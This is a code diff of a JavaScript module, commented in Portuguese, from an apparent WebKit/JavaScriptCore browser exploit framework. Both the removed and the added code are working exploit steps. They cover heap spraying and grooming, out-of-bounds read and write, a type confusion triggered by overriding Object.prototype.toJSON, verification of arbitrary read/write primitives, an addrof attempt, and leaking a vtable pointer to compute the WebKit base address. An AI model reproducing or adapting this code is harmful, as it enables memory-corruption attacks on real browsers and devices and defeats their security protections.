@@ -3,178 +3,234 @@ import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
-    oob_read_absolute,
     oob_write_absolute,
-    arb_read,
-    arb_write,
+    oob_read_absolute,
     clearOOBEnvironment,
-    isOOBReady
+    isOOBReady,
+    arb_read,
+    arb_write
 } from '../core_exploit.mjs';
-import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
+import { OOB_CONFIG } from '../config.mjs';
 
-export const FNAME_MODULE_V28 = "Combined_GroomAndLeak_v1";
+export const FNAME_MODULE_V28 = "CombinedExploitAnalysis_v1";
 
-// --- Constantes para o Exploit ---
-const HEAP_SPRAY_COUNT = 512; // Número de objetos para o heap spray
-const VICTIM_AB_SIZE = 64;    // Tamanho do nosso ArrayBuffer vítima
-const OOB_SCAN_RANGE = 4096;  // Quantos bytes escanear além do nosso buffer OOB
+// =======================================================================================
+// VARIÁVEIS E FUNÇÕES GLOBAIS
+// =======================================================================================
 
-// Valor mágico para identificar nosso vítima no heap
-const VICTIM_MAGIC_LOW = 0xCAFE0000;
-const VICTIM_MAGIC_HIGH = 0x13370000;
-const VICTIM_MAGIC_QWORD = new AdvancedInt64(VICTIM_MAGIC_LOW, VICTIM_MAGIC_HIGH);
+// --- Variáveis para a Fase 1: Verificação de Primitivas ---
+const GETTER_TARGET_ADDR = new AdvancedInt64(0x00000D00, 0x00000000); // Endereço absoluto para teste
+const GETTER_TARGET_DATA = new AdvancedInt64(0xCAFED00D, 0xBEADFACE); // Dados para teste
+const GETTER_ADDR_PLANT_OFFSET = 0x68;
+const GETTER_DATA_COPY_OFFSET = 0x100;
+let getter_phase1_result = false;
 
-// Alvo da corrupção para acionar a Heisenbug
+// --- Variáveis para as Fases 2 & 3: Análise da Confusão de Tipos e Addrof ---
 const HEISENBUG_TRIGGER_OFFSET = 0x7C;
-const HEISENBUG_TRIGGER_VALUE = 0xFFFFFFFF;
+const HEISENBUG_TRIGGER_VALUE  = 0xFFFFFFFF;
+const VICTIM_AB_SIZE = 64;
+let victim_ab_ref = null;
+let object_to_leak_ref = null;
+let type_confusion_details = null;
 
-// Variável global para a sonda toJSON
-let toJSON_call_details = null;
+// =======================================================================================
+// PLACEHOLDER CRÍTICO PARA ADDROF - SUBSTITUA ESTA FUNÇÃO!
+// =======================================================================================
+/**
+ * ESTA É A FUNÇÃO QUE VOCÊ DEVE SUBSTITUIR.
+ * Implemente sua técnica de 'heap grooming' + 'leitura OOB adjacente' ou outra
+ * forma de 'addrof' aqui para retornar o endereço de memória real do objeto.
+ * @param {object} obj - O objeto cujo endereço queremos.
+ * @returns {AdvancedInt64 | null} - O endereço de memória como AdvancedInt64 ou null se falhar.
+ */
+async function get_address_of_object_placeholder(obj) {
+    logS3(`[get_address_of_object_placeholder] AVISO: Usando função placeholder para addrof. A análise de memória será pulada.`, "warn", FNAME_MODULE_V28);
+    logS3(`[get_address_of_object_placeholder] Para habilitar a análise, substitua esta função pela sua primitiva 'addrof' real.`, "warn", FNAME_MODULE_V28);
+    // Para o script não quebrar, retornamos null.
+    // Quando você tiver seu addrof, faça-o retornar o endereço aqui.
+    // Ex: return await real_addrof(obj);
+    return null;
+}
 
-// Sonda toJSON para acionar a confusão de tipos
-function HeisenbugProbe() {
-    toJSON_call_details = {
-        probe_called: true,
-        this_type_in_toJSON: Object.prototype.toString.call(this)
+// =======================================================================================
+// FUNÇÕES AUXILIARES E SONDAS
+// =======================================================================================
+
+/**
+ * Helper para dumpar memória usando arb_read.
+ */
+async function dump_memory(address, length = 64) {
+    if (!address || !isAdvancedInt64Object(address)) {
+        logS3(`[dump_memory] Endereço inválido para dump.`, "error");
+        return "Endereço Inválido";
+    }
+    logS3(`[dump_memory] Dumpando ${length} bytes a partir de ${address.toString(true)}...`, "leak");
+    let dump_str = "";
+    try {
+        for (let i = 0; i < length; i += 8) {
+            const qword = await arb_read(address.add(i), 8);
+            if (i % 16 === 0) {
+                dump_str += `\n${address.add(i).toString(true)}: `;
+            }
+            dump_str += `${qword.toString(true)} `;
+        }
+    } catch (e) {
+        dump_str += `\nERRO durante o dump: ${e.message}`;
+    }
+    logS3(dump_str, "leak");
+    return dump_str;
+}
+
+/**
+ * Sonda toJSON para a tentativa de addrof.
+ */
+function toJSON_ProbeForAddrof() {
+    type_confusion_details = {
+        this_type: Object.prototype.toString.call(this),
+        probe_called: true
     };
+    try {
+        if (type_confusion_details.this_type === '[object Object]') {
+            logS3(`[toJSON_ProbeForAddrof] CONFUSÃO DE TIPOS DETECTADA! Tentando escrever objeto alvo em this[0]...`, "vuln");
+            this[0] = object_to_leak_ref;
+        }
+    } catch (e) { /* ignorar erros aqui */ }
     return { probe_executed: true };
 }
 
-// --- Função Principal do Exploit ---
+/**
+ * Getter para o teste de verificação da Fase 1.
+ */
+async function verifyingGetter() {
+    logS3(`[verifyingGetter] Getter da Fase 1 acionado!`, "info");
+    try {
+        const targetAddr = oob_read_absolute(GETTER_ADDR_PLANT_OFFSET, 8);
+        const dataRead = await arb_read(targetAddr, 8);
+        oob_write_absolute(GETTER_DATA_COPY_OFFSET, dataRead, 8);
 
-export async function executeArrayBufferVictimCrashTest() {
-    const FNAME_CURRENT_TEST = FNAME_MODULE_V28;
-    logS3(`--- INICIANDO TESTE COMBINADO: ${FNAME_CURRENT_TEST} ---`, "test");
-    document.title = `${FNAME_MODULE_V28} Inic...`;
+        if (dataRead.equals(GETTER_TARGET_DATA)) {
+            getter_phase1_result = true;
+        }
+    } catch(e) {
+        logS3(`[verifyingGetter] ERRO no getter da Fase 1: ${e.message}`, "error");
+        getter_phase1_result = false;
+    }
+}
 
-    // Resetar estado
-    toJSON_call_details = null;
-    let victim_ab_addr = null;
-    let webkit_base_addr = null;
+
+// =======================================================================================
+// FUNÇÃO DE TESTE PRINCIPAL E COMBINADA
+// =======================================================================================
+
+export async function executeArrayBufferVictimCrashTest() { // Nome mantido para compatibilidade
+    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.executeCombinedAnalysis`;
+    logS3(`==== INICIANDO TESTE COMBINADO: Análise de Confusão de Tipos com Primitivas Verificadas ====`, "test", FNAME_CURRENT_TEST);
 
     try {
-        // ======================================================================================
-        // FASE 1: PREPARAÇÃO DO HEAP (HEAP GROOMING) E LOCALIZAÇÃO DO VÍTIMA
-        // ======================================================================================
-        logS3("FASE 1: Preparando o Heap e procurando o endereço do 'victim_ab'...", "info");
-        
-        // Criamos um grande array para o nosso spray
-        let heap_spray = new Array(HEAP_SPRAY_COUNT);
-        
-        // Preenchemos com objetos vítima, cada um marcado com um valor mágico
-        logS3(`  Alocando ${HEAP_SPRAY_COUNT} objetos 'vítima' marcados...`);
-        for (let i = 0; i < HEAP_SPRAY_COUNT; i++) {
-            let buf = new ArrayBuffer(VICTIM_AB_SIZE);
-            let view = new BigUint64Array(buf);
-            view[0] = VICTIM_MAGIC_QWORD.toBigInt(); // Marca o início do buffer
-            heap_spray[i] = { buf: buf, view: view }; // Manter referência
-        }
-
-        // Criamos "buracos" no heap para aumentar a chance de alocação adjacente
-        for (let i = 0; i < HEAP_SPRAY_COUNT; i += 2) {
-            heap_spray[i] = null;
-        }
-
-        // Agora alocamos nossos objetos de exploit, esperando que caiam em um "buraco"
         await triggerOOB_primitive({ force_reinit: true });
-        if (!isOOBReady()) throw new Error("Falha ao inicializar o ambiente OOB.");
-        const victim_ab = new ArrayBuffer(VICTIM_AB_SIZE);
+        if (!isOOBReady()) throw new Error("Falha na inicialização do ambiente OOB.");
+        logS3("Ambiente OOB configurado com sucesso.", "good", FNAME_CURRENT_TEST);
+
+        // -----------------------------------------------------------------------------------
+        // FASE 1: VERIFICAR SE arb_read/arb_write ESTÃO FUNCIONAIS (Teste do Getter)
+        // -----------------------------------------------------------------------------------
+        logS3(`\n--- FASE 1: Verificando funcionalidade de arb_read/arb_write... ---`, "subtest", FNAME_CURRENT_TEST);
+        getter_phase1_result = false;
+        await arb_write(GETTER_TARGET_ADDR, GETTER_TARGET_DATA, 8);
+        oob_write_absolute(GETTER_ADDR_PLANT_OFFSET, GETTER_TARGET_ADDR, 8);
+
+        const getter_obj = {};
+        Object.defineProperty(getter_obj, 'trigger', { get: verifyingGetter, configurable: true });
+        getter_obj.trigger; // Acionar o getter
+        await PAUSE_S3(500); // Pausa para operações async do getter
+
+        const copied_data = oob_read_absolute(GETTER_DATA_COPY_OFFSET, 8);
+        if (getter_phase1_result && copied_data.equals(GETTER_TARGET_DATA)) {
+            logS3("FASE 1 SUCESSO: Primitivas arb_read e arb_write estão operacionais.", "good", FNAME_CURRENT_TEST);
+        } else {
+            throw new Error("Falha na Fase 1: Primitivas de Leitura/Escrita não estão funcionando. Abortando.");
+        }
+
+        // -----------------------------------------------------------------------------------
+        // FASE 2: ANÁLISE DA CONFUSÃO DE TIPOS COM arb_read
+        // -----------------------------------------------------------------------------------
+        logS3(`\n--- FASE 2: Análise de Memória da Confusão de Tipos ---`, "subtest", FNAME_CURRENT_TEST);
+        victim_ab_ref = new ArrayBuffer(VICTIM_AB_SIZE);
         
-        // Agora, usamos a leitura OOB para encontrar um de nossos vítimas
-        logS3("  Procurando pelo 'vítima' adjacente usando leitura OOB...");
-        for (let i = 0; i < OOB_SCAN_RANGE; i += 8) {
-            const current_offset = OOB_CONFIG.ALLOCATION_SIZE + i;
-            const potential_magic = await oob_read_absolute(current_offset, 8);
-            
-            if (isAdvancedInt64Object(potential_magic) && potential_magic.equals(VICTIM_MAGIC_QWORD)) {
-                // Encontramos o DADO do vítima. O objeto JSCell começa um pouco antes.
-                // Esta é uma suposição, pode precisar de ajuste. Assumimos que o objeto está 16 bytes antes dos dados.
-                victim_ab_addr = new AdvancedInt64(current_offset).sub(16);
-                victim_ab_addr = victim_ab_addr.add(OOB_CONFIG.BASE_OFFSET_IN_DV); // Ajuste com base na configuração
-                logS3(`  VÍTIMA ENCONTRADO! Endereço estimado do objeto: ${victim_ab_addr.toString(true)}`, "good");
-                break;
-            }
+        const addr_victim_ab = await get_address_of_object_placeholder(victim_ab_ref);
+
+        if (addr_victim_ab) {
+            logS3("Análise de Memória Habilitada (addrof fornecido).", "info", FNAME_CURRENT_TEST);
+            logS3("--- Dump de Memória ANTES da Confusão ---", "info");
+            await dump_memory(addr_victim_ab);
+
+            logS3("Ativando a Confusão de Tipos...", "warn");
+            oob_write_absolute(HEISENBUG_TRIGGER_OFFSET, HEISENBUG_TRIGGER_VALUE, 4);
+            // Poluir e chamar JSON.stringify sem a sonda de escrita addrof por enquanto
+            const originalToJSON = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
+            Object.defineProperty(Object.prototype, 'toJSON', { value: () => ({}), configurable: true });
+            JSON.stringify(victim_ab_ref);
+            if (originalToJSON) Object.defineProperty(Object.prototype, 'toJSON', originalToJSON);
+             await PAUSE_S3(100);
+
+            logS3("--- Dump de Memória DEPOIS da Confusão ---", "info");
+            await dump_memory(addr_victim_ab);
+            logS3("Análise de Memória Concluída. Compare os dumps 'antes' e 'depois' para encontrar o vetor de exploração.", "good");
+
+        } else {
+            logS3("Análise de Memória Pulada: a primitiva 'addrof' real é necessária.", "warn", FNAME_CURRENT_TEST);
         }
 
-        if (!victim_ab_addr) {
-            throw new Error("Falha ao encontrar o endereço do 'victim_ab'. O Heap Grooming pode ter falhado.");
-        }
+        // -----------------------------------------------------------------------------------
+        // FASE 3: REAVALIAÇÃO DA TENTATIVA DE ADDROF
+        // -----------------------------------------------------------------------------------
+        logS3(`\n--- FASE 3: Reavaliando a tentativa de 'addrof'... ---`, "subtest", FNAME_CURRENT_TEST);
+        object_to_leak_ref = { marker: "TARGET" };
+        const float_view = new Float64Array(victim_ab_ref);
+        const original_float_val = Math.random();
+        float_view[0] = original_float_val;
+        type_confusion_details = null;
 
-        // ======================================================================================
-        // FASE 2: ANÁLISE "ANTES" E "DEPOIS" DA CONFUSÃO DE TIPOS
-        // ======================================================================================
-        logS3("FASE 2: Analisando a memória do 'victim_ab' com arb_read...", "info");
-
-        // Dump "ANTES"
-        logS3("  Dump de memória ANTES da confusão de tipos:", "info");
-        const memory_before = await arb_read(victim_ab_addr, 64); // Lê 64 bytes
-        logS3(`    [${victim_ab_addr.toString(true)}] DUMP: ${memory_before.toString(true)}...`, "leak");
-
-        // Acionar a Heisenbug
-        logS3("  Acionando a Heisenbug (confusão de tipos)...", "warn");
+        logS3(`Ativando gatilho da Heisenbug em ${toHex(HEISENBUG_TRIGGER_OFFSET)}...`, "warn");
         oob_write_absolute(HEISENBUG_TRIGGER_OFFSET, HEISENBUG_TRIGGER_VALUE, 4);
-        
-        const ppKey = 'toJSON';
-        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
-        Object.defineProperty(Object.prototype, ppKey, {
-            value: HeisenbugProbe,
-            writable: true, configurable: true, enumerable: false
-        });
-        JSON.stringify(victim_ab);
-        Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); // Limpar
 
-        if (!toJSON_call_details || toJSON_call_details.this_type_in_toJSON !== '[object Object]') {
-            throw new Error("A confusão de tipos não foi acionada com sucesso.");
+        const originalToJSON = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
+        Object.defineProperty(Object.prototype, 'toJSON', { value: toJSON_ProbeForAddrof, configurable: true });
+        
+        logS3("Chamando JSON.stringify no objeto vítima para acionar a sonda de addrof...", "warn");
+        JSON.stringify(victim_ab_ref);
+        
+        if (originalToJSON) Object.defineProperty(Object.prototype, 'toJSON', originalToJSON);
+
+        logS3(`Detalhes da sonda: ${JSON.stringify(type_confusion_details)}`, "leak");
+        if (type_confusion_details && type_confusion_details.this_type === '[object Object]') {
+            logS3("Confusão de tipos confirmada na Fase 3.", "good");
+            const final_float_val = float_view[0];
+            if (final_float_val !== original_float_val) {
+                const leaked_addr = new AdvancedInt64(new Float64Array([final_float_val]).buffer);
+                logS3(`!!!! SUCESSO ADDROF !!!! Endereço vazado: ${leaked_addr.toString(true)}`, "vuln");
+                document.title = `ADDROF SUCESSO!`;
+            } else {
+                logS3("FALHA ADDROF: A confusão de tipos ocorreu, mas o buffer não foi modificado.", "error");
+                document.title = `Type Confusion OK, Addrof Falhou`;
+            }
+        } else {
+            logS3("FALHA ADDROF: A confusão de tipos não foi detectada nesta tentativa.", "error");
+             document.title = `Type Confusion Falhou`;
         }
-        logS3("  Confusão de tipos acionada com sucesso!", "good");
 
-        // Dump "DEPOIS"
-        logS3("  Dump de memória DEPOIS da confusão de tipos:", "info");
-        const memory_after = await arb_read(victim_ab_addr, 64);
-        logS3(`    [${victim_ab_addr.toString(true)}] DUMP: ${memory_after.toString(true)}...`, "leak");
 
-        // ======================================================================================
-        // FASE 3: VAZAMENTO DE PONTEIRO E CÁLCULO DO ENDEREÇO BASE
-        // ======================================================================================
-        logS3("FASE 3: Procurando por ponteiros vazados e calculando o endereço base...", "info");
-        
-        // A primeira QWORD (8 bytes) de um JSCell é seu cabeçalho, que contém o ponteiro para a Structure.
-        // Vamos verificar se este ponteiro mudou para algo que pareça um ponteiro de vtable.
-        const structure_ptr_before = new AdvancedInt64(memory_before.low(), memory_before.high());
-        const structure_ptr_after = new AdvancedInt64(memory_after.low(), memory_after.high());
-        
-        logS3(`  Structure Pointer ANTES:  ${structure_ptr_before.toString(true)}`, "leak");
-        logS3(`  Structure Pointer DEPOIS: ${structure_ptr_after.toString(true)}`, "leak");
-
-        if (structure_ptr_after.equals(structure_ptr_before)) {
-            throw new Error("O ponteiro da Structure não mudou. A estratégia de vazamento falhou.");
-        }
-        
-        // Assumimos que o novo ponteiro é para uma VTable. Vamos ler seu primeiro ponteiro de função.
-        const leaked_vtable_ptr = structure_ptr_after;
-        logS3(`  Ponteiro de VTable vazado: ${leaked_vtable_ptr.toString(true)}`, "good");
-        
-        const leaked_func_ptr = await arb_read(leaked_vtable_ptr, 8);
-        logS3(`  Ponteiro de Função vazado (da VTable): ${leaked_func_ptr.toString(true)}`, "vuln");
-        
-        // Agora, calculamos o endereço base. Usaremos o offset de JSC::JSObject::put, que é
-        // um candidato comum para a primeira entrada de uma vtable de objeto.
-        const put_offset_str = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"];
-        if (!put_offset_str) throw new Error("Offset para 'JSC::JSObject::put' não encontrado em config.mjs.");
-
-        const put_offset = new AdvancedInt64(put_offset_str);
-        webkit_base_addr = leaked_func_ptr.sub(put_offset);
-
-        logS3(`  Offset de 'JSC::JSObject::put': ${put_offset.toString(true)}`, "info");
-        logS3(`  !!!! ENDEREÇO BASE DA WEBKIT ENCONTRADO !!!! -> ${webkit_base_addr.toString(true)}`, "vuln");
-        document.title = `WebKit Base: ${webkit_base_addr.toString(true)}`;
-        
     } catch (e) {
-        logS3(`ERRO CRÍTICO NO EXPLOIT: ${e.message}`, "critical");
-        if(e.stack) logS3(e.stack, "critical");
-        document.title = `${FNAME_MODULE_V28} FALHOU`;
+        logS3(`ERRO CRÍTICO NA EXECUÇÃO COMBINADA: ${e.name} - ${e.message}`, "critical", FNAME_CURRENT_TEST);
+        logS3(e.stack, "critical");
+        document.title = `ERRO CRÍTICO`;
     } finally {
         clearOOBEnvironment();
-        logS3(`--- ${FNAME_CURRENT_TEST} CONCLUÍDO ---`, "test");
+        victim_ab_ref = null;
+        object_to_leak_ref = null;
+        logS3("\n==== TESTE COMBINADO CONCLUÍDO ====", "test", FNAME_CURRENT_TEST);
     }
+    
+    // Retorna um objeto de resultado para compatibilidade com o orquestrador
+    return { success: true }; 
 }
